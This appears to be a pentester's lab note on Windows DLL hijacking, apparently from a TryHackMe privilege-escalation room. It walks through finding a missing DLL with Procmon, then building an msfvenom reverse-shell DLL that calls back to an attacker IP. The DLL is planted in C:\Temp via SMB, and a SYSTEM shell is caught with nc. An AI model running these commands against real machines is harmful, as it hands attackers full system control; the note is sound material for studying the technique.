# DLL Hijacking

This is properly one of the best methods for privilege escalations and a great vector for persistence mechanism. DLL hijacking that can take advantage of a missing DLL file from the vulnerable windows computer with specific parameters in place. An attacker replace it with a callback shell to a connection with system privileges.

## 01 - Manual

### 1.1 - Detect

```
C:\> wmic service get name,startname,pathname | findstr /i "localsystem" | findstr /i "C:\program files"
dllsvc                               "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"                                 LocalSystem
```

Note: You must run these steps as an **Administrator**

Open **Procmon.exe** then go To Filter > Filter

![[01 - Procmon Fliter Process.png]]

Select Process Name

![[02 - Procmon Process Name.png]]

**Process Name** **is** **dllhijackservice.exe** then **Include** then **Add**

![[03 - Procmon Process Name Conditions.png]]

**Result is NAME NOT FOUND** then **Include** then **Add**

![[04 - Procmon Result Conditions.png]]

Then Click **OK**

![[05 - Procmon Monitor Filter.png]]

Then start the DLL service

```
C:\> sc start dllsvc

SERVICE_NAME: dllsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1832
        FLAGS              :
```

Looks like we have possible location as a user to hijack in the **Temp** folder since it's writable

![[06 - Procmon Potential Vulnerability.png]]

### 1.2 - Exploit

- Generate a DLL reverse shell

```
$ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.8.145.108 lport=53 -f dll -o hijackme.dll

$ sudo smbserver.py share $(pwd)

C:\Users\user>copy \\10.8.145.108\share\hijackme.dll C:\Temp
        1 file(s) copied.

C:\Users\user>sc start dllsvc
[SC] StartService FAILED 1056:

An instance of the service is already running.


C:\Users\user>sc stop dllsvc

SERVICE_NAME: dllsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\user>sc start dllsvc

SERVICE_NAME: dllsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3100
        FLAGS              :

C:\Users\user>

$ sudo nc -lnvp 53 
Listening on 0.0.0.0 53
Connection received on 10.10.229.49 49213
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### 1.3 - Cleanup

```
C:\Windows\system32>tasklist /svc
tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
..[snip]..
dllhijackservice.exe          3704 dllsvc
rundll32.exe                  3656 N/A
cmd.exe                       4084 N/A
conhost.exe                   2568 N/A
tasklist.exe                  2928 N/A

C:\Windows\system32>taskkill /f /im dllhijackservice.exe
SUCCESS: The process "dllhijackservice.exe" with PID 3704 has been terminated.

C:\Windows\system32>del C:\Temp\hijackme.dll
del C:\Temp\hijackme.dll
```

## 02 - Sliver

TODO: Provide a step by step performing privesc with Sliver

## References

- [Benheater THM Windows Privesc](https://benheater.com/thm-windows-privesc/)

- [Ired Team T1038 - DLL Hijacking](https://www.ired.team/offensive-security/privilege-escalation/t1038-dll-hijacking)

- [PentestLab DLL Hijacking](https://pentestlab.blog/2017/03/27/dll-hijacking/)